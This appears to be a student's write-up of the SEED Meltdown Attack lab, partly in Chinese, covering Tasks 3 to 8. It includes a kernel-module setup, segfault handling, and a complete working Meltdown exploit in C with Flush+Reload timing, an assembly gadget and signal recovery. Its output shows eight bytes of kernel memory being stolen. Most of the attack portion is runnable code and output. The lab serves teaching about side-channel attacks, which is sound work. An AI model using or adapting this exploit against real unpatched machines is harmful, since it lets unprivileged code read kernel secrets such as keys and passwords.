# Meltdown Attack

## Tasks 1 and 2: Side Channel Attacks via CPU Caches

同Spectre Attack Lab。

## Tasks 3-5: Preparation for the Meltdown Attack

### Task 3: Place Secret Data in Kernel Space

```shell
$ make
$ sudo insmod MeltdownKernel.ko
$ dmesg | grep 'secret data address'
[ 2956.059508] secret data address:f9d8b000

```

### Task 4: Access Kernel Memory from User Space

```c
#include "stdio.h"

int main()
{
	char *kernel_data_addr = (char*)0xf9d8b000; 	// MARK 1
	char kernel_data = *kernel_data_addr; 	// MARK 2
	printf("I have reached here.\n"); 	// MARK 3
	return 0;
}
```

```shell
$ nano task4.c
$ gcc -march=native -o task4 task4.c
$ ./task4 
Segmentation fault

```

## Task 5: Handle Error/Exceptions in C

```c
#include "stdio.h"
#include "signal.h"
#include "setjmp.h"
static sigjmp_buf jbuf;
static void catch_segv()
{
// Roll back to the checkpoint set by sigsetjmp().
	siglongjmp(jbuf, 1);
}
int main()
{
// The address of our secret data
	unsigned long kernel_data_addr = 0xf9d8b000;
// Register a signal handler
	signal(SIGSEGV, catch_segv);
	if (sigsetjmp(jbuf, 1) == 0) {
// A SIGSEGV signal will be raised.
		char kernel_data = *(char*)kernel_data_addr;
// The following statement will not be executed.
		printf("Kernel data at address %lu is: %c\n",
		       kernel_data_addr, kernel_data);
	}
	else {
		printf("Memory access violation!\n");
	}
	printf("Program continues to execute.\n");
	return 0;
}
```



```shell

$ nano exception.c
$ gcc -march=native -o exception exception.c
$ ./exception 
Memory access violation!
Program continues to execute.

```

## Task 6: Out-of-Order Execution by CPU

```shell
$ gcc -march=native -o MeltdownExperiment MeltdownExperiment.c 
$ ./MeltdownExperiment 
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.

```



## Task 7: The Basic Meltdown Attack

### Task 7.1: A Naive Approach

```shell
$ ./MeltdownExperiment
Memory access violation!

```

攻击不成功。

### Task 7.2: Improve the Attack by Getting the Secret Data Cached

在预读secret后，攻击仍然不成功。

### Task 7.3: Using Assembly Code to Trigger Meltdown

第一次仍不成功，将汇编代码中的400改为800后成功了。

```shell
$ ./MeltdownExperiment Memory access violation!
array[83*4096 + 1024] is in cache.
The Secret = 83.

```

## Task 8: Make the Attack More Practical

```c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

/*********************** Flush + Reload ************************/
uint8_t array[256 * 4096];
/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i * 4096 + DELTA] = 1;

  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i * 4096 + DELTA]);
}

static int scores[256];

void reloadSideChannelImproved()
{
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  }
}
/*********************** Flush + Reload ************************/

void meltdown_asm(unsigned long kernel_data_addr)
{
  char kernel_data = 0;

  // Give eax register something to do
  asm volatile(
    ".rept 800;"
    "add $0x141, %%eax;"
    ".endr;"

    :
    :
    : "eax"
  );

  // The following statement will cause an exception
  kernel_data = *(char*)kernel_data_addr;
  array[kernel_data * 4096 + DELTA] += 1;
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv()
{
  siglongjmp(jbuf, 1);
}

int main()
{
  for (int idx = 0; idx < 8; ++idx) {
    int i, j, ret = 0;

    // Register signal handler
    signal(SIGSEGV, catch_segv);

    int fd = open("/proc/secret_data", O_RDONLY);
    if (fd < 0) {
      perror("open");
      return -1;
    }

    memset(scores, 0, sizeof(scores));
    flushSideChannel();


    // Retry 1000 times on the same address.
    for (i = 0; i < 1000; i++) {
      ret = pread(fd, NULL, 0, 0);
      if (ret < 0) {
        perror("pread");
        break;
      }

      // Flush the probing array
      for (j = 0; j < 256; j++)
        _mm_clflush(&array[j * 4096 + DELTA]);

      if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xf9d8b000 + idx); }

      reloadSideChannelImproved();
    }

    // Find the index with the highest score.
    int max = 0;
    for (i = 0; i < 256; i++) {
      if (scores[max] < scores[i]) max = i;
    }
    printf("Position of stolen byte is %d \n", idx);
    printf("The secret value is %d %c\n", max, max);
    printf("The number of hits is %d\n\n", scores[max]);

  }

  return 0;
}

```



```shell
$ vim MeltdownAttack.c
$ gcc -march=native -o MeltdownAttack MeltdownAttack.c 
$ ./MeltdownAttack 
Position of stolen byte is 0 
The secret value is 83 S
The number of hits is 978

Position of stolen byte is 1 
The secret value is 69 E
The number of hits is 973

Position of stolen byte is 2 
The secret value is 69 E
The number of hits is 975

Position of stolen byte is 3 
The secret value is 68 D
The number of hits is 976

Position of stolen byte is 4 
The secret value is 76 L
The number of hits is 986

Position of stolen byte is 5 
The secret value is 97 a
The number of hits is 991

Position of stolen byte is 6 
The secret value is 98 b
The number of hits is 986

Position of stolen byte is 7 
The secret value is 115 s
The number of hits is 965


```

